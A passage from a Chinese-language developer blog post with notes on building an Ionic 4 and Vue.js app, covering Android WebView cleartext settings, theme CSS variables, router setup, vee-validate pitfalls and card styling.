9.0 WebView无法加载页面报错net：ERR_CLEARTEXT_NOT_PERMITTED</code>,从Android 9.0（API级别28）开始，默认情况下禁用明文支持。因此http的url均无法在webview中加载。</p></li></ol><blockquote><p>在<code>AndroidManifest.xml</code>文件中的<code>application</code>标签添加<code>android:usesCleartextTraffic=&quot;true&quot;</code></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;manifest ...&gt;</span><br><span class="line">    &lt;uses-permission android:name&#x3D;&quot;android.permission.INTERNET&quot; &#x2F;&gt;</span><br><span class="line">    &lt;application</span><br><span class="line">        ...</span><br><span class="line">        android:usesCleartextTraffic&#x3D;&quot;true&quot;</span><br><span class="line">        ...&gt;</span><br><span class="line">        ...</span><br><span class="line">    &lt;&#x2F;application&gt;</span><br><span class="line">&lt;&#x2F;manifest&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="7"><li><p>ionic 切换页面时会添加<code>ion-page-invisible</code>,导致页面白屏,参考问题：</p></li><li><p>vue阻止冒泡到父级节点的事件 <code>@click.stop</code>：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;div v-for&#x3D;&quot;(image,index) in currentImages&quot;</span><br><span class="line">     :key&#x3D;&quot;image.src&quot;  @click&#x3D;&quot;previewImage(image, index)&quot;&gt;</span><br><span class="line">  &lt;li class&#x3D;&quot;weui-uploader__file&quot;</span><br><span class="line">      :style&#x3D;&quot;&#123; backgroundImage: &#96;url($&#123;image.src&#125;)&#96;&#125;&quot;</span><br><span class="line">     &gt;</span><br><span class="line">    &lt;ion-icon name&#x3D;&quot;ios-close-circle&quot; class&#x3D;&quot;weui-close-icon&quot; @click.stop&#x3D;&quot;removeImage(image, index)&quot;&gt;&lt;&#x2F;ion-icon&gt;</span><br><span class="line">  &lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><ol start="9"><li><p>cordova phone call打电话代码: <code>location.href=&#39;tel:13052113519&#39;</code>或者 <code>window.open(&#39;tel:13052113519&#39;)</code></p></li><li><p>离线存储解决方案: <code>localForage</code></p></li><li><p><code>promise</code>, <code>async</code>和<code>await</code>的讲解</p></li></ol><p>参考： <a href="https://www.cnblogs.com/CandyManPing/p/9384104.html" target="_blank" rel="noopener">https://www.cnblogs.com/CandyManPing/p/9384104.html</a></p><ol><li>async 告诉程序这是一个异步，awiat 会暂停执行async中的代码，等待await 表达式后面的结果，跳过async 函数，继续执行后面代码</li><li>async 函数会返回一个Promise 对象，那么当 async 函数返回一个值时，Promise 的 resolve 方法会负责传递这个值；当 async 函数抛出异常时，Promise 的 reject 方法也会传递这个异常值</li><li>await  操作符用于等待一个Promise 对象，并且返回 Promise 对象的处理结果（成功把resolve 函数参数作为await 表达式的值），如果等待的不是 Promise 对象，则用 Promise.resolve(xx) 转化</li></ol><h3 id="例子参考"><a href="#例子参考" class="headerlink" title="例子参考"></a>例子参考</h3><ol><li><a href="https://github.com/nklayman/vue-cli-plugin-capacitor/blob/master/index.js" target="_blank" rel="noopener">https://github.com/nklayman/vue-cli-plugin-capacitor/blob/master/index.js</a></li><li><a href="https://github.com/pietrovieira/Vuejs-Ionic4-Ionic-Capacitor/blob/master/src/App.vue" target="_blank" rel="noopener">https://github.com/pietrovieira/Vuejs-Ionic4-Ionic-Capacitor/blob/master/src/App.vue</a></li><li><a href="https://github.com/aaronksaunders/icon-vue/blob/master/src/components/Login.vue" target="_blank" rel="noopener">sample app using capacitor vuejs and ionicv4 components</a></li><li><a href="https://github.com/Balintataw/restaurant-mobile-app" target="_blank" rel="noopener">Mobile app built with Vue.js, Ionic 4(beta), and wrapped by Capacitor</a></li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li>vue-cli-plugin-ionic <a href="https://github.com/ionic-team/vue-cli-plugin-ionic" target="_blank" rel="noopener">cli3-plugin-ionic</a></li><li>Vue start app <a href="https://github.com/ionic-team/ionic-vue-conference-app/blob/master/src/views/Tabs.vue" target="_blank" rel="noopener">ionic-vue-conference-app</a></li><li>Vue ionic author’s example <a href="https://github.com/ModusCreateOrg/beep" target="_blank" rel="noopener">beep</a></li><li>所有的demo代码：<a href="https://github.com/ionic-team/ionic-docs/blob/master/src/demos/api/item/index.html" target="_blank" rel="noopener">官方网站demo</a></li><li>Ionc start app <a href="https://github.com/ionic-team/ionic-conference-app/blob/master/src/app/pages/account/account.html" target="_blank" rel="noopener">ionic-conference-app</a></li></ul><h3 id="集成步骤"><a href="#集成步骤" class="headerlink" title="集成步骤"></a>集成步骤</h3><ol><li>引入库：</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;@ionic/core&quot;: &quot;latest&quot;,</span><br><span class="line">&quot;@ionic/vue&quot;: &quot;^0.0.4&quot;,</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>引入<code>@ionic/vue</code>相关组件：</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Ionic <span class="keyword">from</span> <span class="string">&#x27;@ionic/vue&#x27;</span></span><br><span class="line"><span class="comment">// Ionic all bundle css styles</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@ionic/core/css/ionic.bundle.css&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;../assets/css/ionic-variables.css&#x27;</span></span><br><span class="line">Vue.use(Ionic)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中的<code>ionic-variables.css</code>为自定义主题样式,内容如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ionic Variables and Theming. For more info, please see: */</span></span><br><span class="line"><span class="comment">/* http://ionicframework.com/docs/theming/                 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Ionic CSS Variables **/</span></span><br><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">    <span class="comment">/** primary **/</span></span><br><span class="line">    --ion-<span class="attribute">color</span>-primary: <span class="number">#3880ff</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-primary-rgb: <span class="number">56</span>, <span class="number">128</span>, <span class="number">255</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-primary-contrast: <span class="number">#ffffff</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-primary-contrast-rgb: <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-primary-shade: <span class="number">#3171e0</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-primary-tint: <span class="number">#4c8dff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** secondary **/</span></span><br><span class="line">    --ion-<span class="attribute">color</span>-secondary: <span class="number">#0cd1e8</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-secondary-rgb: <span class="number">12</span>, <span class="number">209</span>, <span class="number">232</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-secondary-contrast: <span class="number">#ffffff</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-secondary-contrast-rgb: <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-secondary-shade: <span class="number">#0bb8cc</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-secondary-tint: <span class="number">#24d6ea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** tertiary **/</span></span><br><span class="line">    --ion-<span class="attribute">color</span>-tertiary: <span class="number">#7044ff</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-tertiary-rgb: <span class="number">112</span>, <span class="number">68</span>, <span class="number">255</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-tertiary-contrast: <span class="number">#ffffff</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-tertiary-contrast-rgb: <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-tertiary-shade: <span class="number">#633ce0</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-tertiary-tint: <span class="number">#7e57ff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** success **/</span></span><br><span class="line">    --ion-<span class="attribute">color</span>-success: <span class="number">#10dc60</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-success-rgb: <span class="number">16</span>, <span class="number">220</span>, <span class="number">96</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-success-contrast: <span class="number">#ffffff</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-success-contrast-rgb: <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-success-shade: <span class="number">#0ec254</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-success-tint: <span class="number">#28e070</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** warning **/</span></span><br><span class="line">    --ion-<span class="attribute">color</span>-warning: <span class="number">#ffce00</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-warning-rgb: <span class="number">255</span>, <span class="number">206</span>, <span class="number">0</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-warning-contrast: <span class="number">#ffffff</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-warning-contrast-rgb: <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-warning-shade: <span class="number">#e0b500</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-warning-tint: <span class="number">#ffd31a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** danger **/</span></span><br><span class="line">    --ion-<span class="attribute">color</span>-danger: <span class="number">#f04141</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-danger-rgb: <span class="number">245</span>, <span class="number">61</span>, <span class="number">61</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-danger-contrast: <span class="number">#ffffff</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-danger-contrast-rgb: <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-danger-shade: <span class="number">#d33939</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-danger-tint: <span class="number">#f25454</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** dark **/</span></span><br><span class="line">    --ion-<span class="attribute">color</span>-dark: <span class="number">#222428</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-dark-rgb: <span class="number">34</span>, <span class="number">34</span>, <span class="number">34</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-dark-contrast: <span class="number">#ffffff</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-dark-contrast-rgb: <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-dark-shade: <span class="number">#1e2023</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-dark-tint: <span class="number">#383a3e</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** medium **/</span></span><br><span class="line">    --ion-<span class="attribute">color</span>-medium: <span class="number">#989aa2</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-medium-rgb: <span class="number">152</span>, <span class="number">154</span>, <span class="number">162</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-medium-contrast: <span class="number">#ffffff</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-medium-contrast-rgb: <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-medium-shade: <span class="number">#86888f</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-medium-tint: <span class="number">#a2a4ab</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** light **/</span></span><br><span class="line">    --ion-<span class="attribute">color</span>-light: <span class="number">#f4f5f8</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-light-rgb: <span class="number">244</span>, <span class="number">244</span>, <span class="number">244</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-light-contrast: <span class="number">#000000</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-light-contrast-rgb: <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-light-shade: <span class="number">#d7d8da</span>;</span><br><span class="line">    --ion-<span class="attribute">color</span>-light-tint: <span class="number">#f5f6f9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>修改<code>App.vue</code>文件，使得<code>ion-app</code>为顶级渲染节点，可以识别不同的设备，从而加载不同的主题样式:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;ion-app&gt;</span><br><span class="line">    &lt;ion-vue-router &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;ion-app&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;App&#39;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li>路由设置,修改路径为<code>@ionic/vue</code>中定制的路由，这个路由跟vue-router是一样的，但是功能可能更多：</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; IonicVueRouter &#125; <span class="keyword">from</span> <span class="string">&#x27;@ionic/vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> routes <span class="keyword">from</span> <span class="string">&#x27;./routes&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(IonicVueRouter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> IonicVueRouter(&#123;</span><br><span class="line">  mode: <span class="string">&#x27;history&#x27;</span>,</span><br><span class="line">  base: process.env.BASE_URL,</span><br><span class="line">  routes: routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="坑-问题"><a href="#坑-问题" class="headerlink" title="坑/问题"></a>坑/问题</h2><ul><li><p>在查看<code>ion-tabs</code>时发现用到了<strong>命名视图</strong>，这个确实很坑啊，以前都一直都用到的是通过<strong>命名路由</strong>的方式进行导航的.<br>认真阅读官方文档：<a href="https://router.vuejs.org/zh/guide/essentials/named-views.html" target="_blank" rel="noopener">命名视图</a></p></li><li><p><code>&lt;ion-input&gt;</code>不能使用<code>v-model</code>,两种方式解决：</p><ul><li>第一种如下的语法糖代码调整：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ion-input</span><br><span class="line">:value&#x3D;&quot;selectedOption&quot;</span><br><span class="line">  @ionChange&#x3D;&quot;selectedOption&#x3D; $event.target.value&quot;</span><br><span class="line">  &gt;</span><br></pre></td></tr></table></figure><ul><li>vuejs官方提出了这个问题没有解决，web component不支持，参考<a href="https://github.com/ionic-team/ionic/issues/15532" target="_blank" rel="noopener">ionic 官方issue</a><br>和对应的<a href="https://github.com/vuejs/vue/issues/7830" target="_blank" rel="noopener">vuejs官方issue</a><br>对应的需要提到的<a href="https://github.com/vuejs/rfcs/blob/v-model/active-rfcs/0000-v-model-api-change.md#usage-on-custom-elements" target="_blank" rel="noopener">问题</a></li></ul></li><li><p><code>type=number</code>在<code>vee-validate</code>中不起作用，使用了<code>v-validate=&quot;&#123;digits: 4&#125;&quot;</code>,原因是:</p><ul><li>vee-validate作者提到问题： <a href="https://github.com/baianat/vee-validate/issues/2043" target="_blank" rel="noopener">github issue</a>:</li></ul><blockquote><p>This is caused by vee-validate trying to validate the field based on their HTML attributes, for <code>number</code> fields the decimal rule is automatically added.<br>   You can turn that behavior off like this:</p><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vue.use(VeeValidate, &#123;</span><br><span class="line">  useConstraintAttrs: false</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></code></pre><p>The problem is that decimal and integer are conflicting rules by definition, so it is advised not to use both at the same time. So Turning the behavior off is the easiest solution for you.</p></blockquote><p>然后看到官方文档提到，有些html5的内置类型和属性，是不需要在添加<code>v-validate</code>进行详细的验证的，只需要添加一个<code>v-validate</code>就可以了，参考：<a href="https://baianat.github.io/vee-validate/guide/inferred-rules.html#inferred-rules-reference" target="_blank" rel="noopener">官方指南</a>:</p></li></ul><h2 id="Inferred-Rules-Reference"><a href="#Inferred-Rules-Reference" class="headerlink" title="Inferred Rules Reference"></a>Inferred Rules Reference</h2><p>This is a table of HTML attributes that is inferred as rules.</p><table><thead><tr><th>Attribute</th><th align="center">value</th><th>Rule</th></tr></thead><tbody><tr><td>type</td><td align="center">“email”</td><td><code>email</code></td></tr><tr><td>type</td><td align="center">“number”</td><td><code>decimal</code></td></tr><tr><td>type</td><td align="center">“date”</td><td><code>date_format:YYYY-MM-DD</code></td></tr><tr><td>type</td><td align="center">“datetime-local”</td><td><code>date_format: YYYY-MM-DDThh:mm</code></td></tr><tr><td>type</td><td align="center">“time”</td><td><code>date_format:hh:mm</code> or <code>date_format:hh:mm:ss</code> depending on the step value</td></tr><tr><td>type</td><td align="center">“week”</td><td><code>date_format:YYYY-Www</code></td></tr><tr><td>type</td><td align="center">“month</td><td><code>date_format:YYYY-MM</code></td></tr><tr><td>min</td><td align="center">val</td><td><code>min_value:val</code></td></tr><tr><td>max</td><td align="center">val</td><td><code>max_value:val</code></td></tr><tr><td>pattern</td><td align="center">rgx</td><td><code>regex: rgx</code></td></tr><tr><td>required</td><td align="center"><em>none</em></td><td><code>required</code></td></tr><tr><td>maxlength</td><td align="center">“val”</td><td><code>max: val</code></td></tr><tr><td>minlength</td><td align="center">“val”</td><td><code>min: val</code></td></tr></tbody></table><p>:::tip<br>  This feature does not work on custom components, only HTML5 inputs can take advantage from this feature.<br>  所以还是采用作者的提议，因为我们使用的是<code>ionic web component</code>, 所以上面的规则还是不适用<br>:::</p><ul><li>同一个页面多表单的校验规则: <a href="https://baianat.github.io/vee-validate/examples/scopes.html" target="_blank" rel="noopener">multiple form</a> ，</li></ul><blockquote><p>For convenience, you may add the data-vv-scope attribute on the form that owns the inputs, you don’t have to add the attribute on every input. You can also pass scope property to the validator expression.  不必每个字段都添加一个scope的属性，这个问题在旧版本中还是需要加上scope的，见问题： <a href="https://github.com/baianat/vee-validate/issues/1206" target="_blank" rel="noopener"><br>How to validate two different forms on one page? #1206</a></p></blockquote><ul><li>ionic 中的<code>color</code>自定义： <a href="https://ionicframework.com/docs/theming/advanced#colors" target="_blank" rel="noopener">https://ionicframework.com/docs/theming/advanced#colors</a></li></ul><h2 id="ionic常用css工具集"><a href="#ionic常用css工具集" class="headerlink" title="ionic常用css工具集"></a>ionic常用css工具集</h2><p> <a href="https://ionicframework.com/docs/layout/css-utilities" target="_blank" rel="noopener">参考官方css工具集</a></p><ul><li>内间距</li></ul><ol><li>子元素上下左右间距 padding</li><li>子元素无间距 no-padding</li><li>子元素上下间距 padding-vertical</li><li>子元素左右间距 padding-horizontal</li></ol><ul><li>外间距</li></ul><ol><li>与外元素间距16px margin</li><li>与外元素无间距  no-margin</li><li>上下元素间距16px margin-vertical</li><li>左右元素间距16px margin-horizontal</li></ol><ul><li>行元素排列顺序 div包裹元素</li></ul><ol><li>text-left</li><li>text-right</li><li>text-start</li><li>text-end</li><li>text-center</li><li>text-justify</li><li>text-wrap</li><li>text-nowrap</li><li>text-uppercase</li><li>text-lowercase</li><li>text-capitalize</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;ion-col&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;ion-text-nowrap&quot;&gt;</span><br><span class="line">    &lt;h3&gt;text-nowrap&lt;&#x2F;h3&gt;</span><br><span class="line">    Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;ion-col&gt;</span><br></pre></td></tr></table></figure><ul><li>边角间距</li></ul><ol><li>no-border</li></ol><ul><li>flex布局</li></ul><h2 id="ionic的card组件样式"><a href="#ionic的card组件样式" class="headerlink" title="ionic的card组件样式"></a>ionic的card组件样式</h2><p>默认的card的周围有灰色的阴影，采用如下样式将对应的灰色去掉：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">.card &#123;</span><br><span class="line">  &#x2F;*border-radius:10px;*&#x2F;</span><br><span class="line">  &#x2F;*box-shadow: 1px 8px 11px rgba(131, 131, 131, 0.25), 0 8px 8px rgba(124, 124, 124, 0.22);*&#x2F;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.card, .list-inset &#123;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">  margin: 20px 10px;</span><br><span class="line">  border-radius: 2px;</span><br><span class="line">  background-color: #fff;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;** 去掉周围阴影**&#x2F;</span><br><span class="line">.card &#123;</span><br><span class="line">  padding-top: 1px;</span><br><span class="line">  padding-bottom: 1px;</span><br><span class="line">  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);</span><br><span class="line">  &#x2F;*box-shadow: none !important;*&#x2F;</span><br><span class="line">  border: none !important;</span><br><span class="line">  border-style: none !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.card .item &#123;</span><br><span class="line">  border-left: 0;</span><br><span class="line">  border-right: 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.card .item:first-child &#123;</span><br><span class="line">  border-top: 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.card .item:last-child &#123;</span><br><span class="line">  border-bottom: 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.padding .card, .padding .list-inset &#123;</span><br><span class="line">  margin-left: 0;</span><br><span class="line">  margin-right: 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.card .item:first-child, .list-inset .item:first-child, .padding &gt; .list .item:first-child &#123;</span><br><span class="line">  border-top-left-radius: 2px;</span><br><span class="line">  border-top-right-radius: 2px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.card .item:first-child .item-content, .list-inset .item:first-child .item-content, .padding &gt; .list .item:first-child .item-content &#123;</span><br><span class="line">  border-top-left-radius: 2px;</span><br><span class="line">  border-top-right-radius: 2px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.card .item:last-child, .list-inset .item:last-child, .padding &gt; .list .item:last-child &#123;</span><br><span class="line">  border-bottom-right-radius: 2px;</span><br><span class="line">  border-bottom-left-radius: 2px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.card .item:last-child .item-content, .list-inset .item:last-child .item-content, .padding &gt; .list .item:last-child .item-content &#123;</span><br><span class="line">  border-bottom-right-radius: 2px;</span><br><span class="line">  border-bottom-left-radius: 2px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.card .item:last-child, .list-inset .item:last-child &#123;</span><br><span class="line">  margin-bottom: -1px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.card .item, .list-inset .item, .padding &gt; .list .item, .padding-horizontal &gt; .list .item &#123;</span><br><span class="line">  margin-right: 0;</span><br><span class="line">  margin-left: 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.card .item.item-input input, .list-inset .item.item-input input, .padding &gt; .list .item.item-input input, .padding-horizontal &gt; .list .item.item-input input &#123;</span><br><span class="line">  padding-right: 44px;</span><br><span class="line">&#125;</span><br><span 